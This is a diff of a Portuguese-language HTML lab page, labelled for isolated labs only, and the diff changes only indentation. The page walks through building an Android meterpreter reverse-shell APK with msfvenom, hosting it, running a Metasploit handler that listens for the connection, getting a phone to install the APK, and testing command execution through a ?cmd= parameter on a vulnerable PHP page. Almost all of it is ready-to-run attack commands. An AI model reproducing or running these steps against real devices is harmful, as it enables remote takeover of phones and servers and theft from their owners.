@@ -145,26 +145,26 @@ http://ip-da-vitima/vulnerable.php?cmd=ipconfig&debug=1</code></pre>
 <h2>Como usar (apenas lab isolado)</h2>
 
 <div class="steps">
-    <h3>1. Gere o payload APK (no atacante – Kali/Parrot)</h3>
-    <pre><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=SEU_IP LPORT=4444 R > payload.apk</code></pre>
+<h3>1. Gere o payload APK (no atacante – Kali/Parrot)</h3>
+<pre><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=SEU_IP LPORT=4444 R > payload.apk</code></pre>
 
-    <h3>2. Hospede o APK</h3>
-    <pre><code>python3 -m http.server 8000</code></pre>
+<h3>2. Hospede o APK</h3>
+<pre><code>python3 -m http.server 8000</code></pre>
 
-    <h3>3. Inicie o handler</h3>
-    <pre><code>msfconsole
+<h3>3. Inicie o handler</h3>
+<pre><code>msfconsole
 use multi/handler
 set payload android/meterpreter/reverse_tcp
 set LHOST seu.ip
 set LPORT 4444
 exploit -j</code></pre>
 
-    <h3>4. Acesse a página PHP no celular/emulador</h3>
-    <pre><code>http://SEU_IP/vulnerable-mobile.php</code></pre>
-    <p>Baixe e instale o APK (ative "Fontes desconhecidas" nas configs do Android).</p>
+<h3>4. Acesse a página PHP no celular/emulador</h3>
+<pre><code>http://SEU_IP/vulnerable-mobile.php</code></pre>
+<p>Baixe e instale o APK (ative "Fontes desconhecidas" nas configs do Android).</p>
 
-    <h3>5. Teste RCE (opcional)</h3>
-    <pre><code>?cmd=id
+<h3>5. Teste RCE (opcional)</h3>
+<pre><code>?cmd=id
 ?cmd=whoami</code></pre>
 </div>
 
